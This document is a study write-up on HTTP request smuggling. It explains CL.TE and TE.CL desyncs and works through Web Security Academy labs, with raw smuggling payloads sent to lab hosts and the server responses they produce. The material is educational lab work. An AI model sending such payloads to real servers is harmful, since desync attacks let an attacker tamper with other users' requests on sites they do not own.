# Http req smuggling
When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection
HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins

It is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems

The attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results

## How do HTTP request smuggling vulnerabilities arise?
Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:
```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a **chunk of size zero**. For example:
```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

> Note:  
> Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:
> - Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
> - Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.

As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:
- Some servers do not support the Transfer-Encoding header in requests.
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

> Note:  
> Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.  
> However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading. For more information, see Advanced request smuggling.

## How to perform an HTTP request smuggling attack
Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:
- CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

> Note  
> These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.  
> As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the Request attributes section of the Inspector panel.

## CL.TE vulnerabilities
Here, the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. We can perform a simple HTTP request smuggling attack as follows
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

### Lab: HTTP request smuggling, basic CL.TE vulnerability
> Note: enable non printable characters in burp before attemptimg this lab

To test the backend servers for CL.TE send the following payload:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X
```
We get 500 Internal Server Error and the msg: "Server Error: Communication timed out"
It happens because the frontend server used Content-Length header and assumed that `abc` is the end of the req.body and so it sended that req.body that ends with `abc` to the backend server.
The backend server used Transfer-Encoding header which means `3` represents the chunk size (and the chunk is `abc`) but the next chunk size is absent. (If it was the last chunk size then instead of `3` we'd specify `0`)
And since the next chunk size and next chunk are missing it could not finish processing the req, so it throwed 500 error and err: Timed out.

#### Solving the lab:
Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
G
```
The second response responded: "Unrecognized method GPOST"

This happens because the frontend server processes the Content-Length header and determines that the request body is 6 bytes long, up to the end of `G`. This request is forwarded on to the back-end server.

The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following byte (`G`), is left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
That's why the second response responded: "Unrecognized method GPOST"

### About `Transfer-Encoding: chunked` (from MDN): 
Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by '\r\n' and then the chunk itself, followed by another '\r\n'. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of header fields. 

### Lab: HTTP request smuggling, basic TE.CL vulnerability
Please note:
The valid ending of the req that is parsed by `Transfer-Encoding: chunked` must be: `0\r\n\r\n`
Otherwise we're getting `Read timeout` err

To test for TE.CL send the following req:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```
As the response we get: 400 Bad Request, {"error":"Invalid request"}
It happens because the frontend server uses Transfer-Encoding header and therefore reads the first chunk (`abc` that has length of 3 bytes) and then it expects the size of the next chunk but instead it gets `X\r\n` which is invalid hex number and therefore it throw an err: 400 Bad request.

We can also check that backend server is using Content-Length header with the following req:
```
POST / HTTP/1.1
Host: ff.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```
The response will be: 500 Internal Server Error, Communication timed out 
Because the frontend server parsed `0` as chunk size and therefore truncated everything after it (in this case `X` was truncated).
And when the backend server received Content-Length of 6 but the actual length of the body was 5 (`0\r\n\r\n` without `X`) - So the backend server will wait for the sixth byte to arrive until it times out and throws an err 

To solve the lab we need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`

So we try:
```bash
POST / HTTP/1.1
Host: 0a0f00a60482050c804058ca009c00e8.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
\r\n
1\r\n
G\r\n
0\r\n
\r\n
```
First response is 200 and the second response: "Unrecognized method G0POST"

We can't just remove `0` from the end because `0\r\n\r\n` is the valid ending of `Transfer-Encoding: chunked` 
If we remove it we'll get a `Read timeout` because the frontend server still expects the valid ending of the body (which is `0\r\n\r\n`)

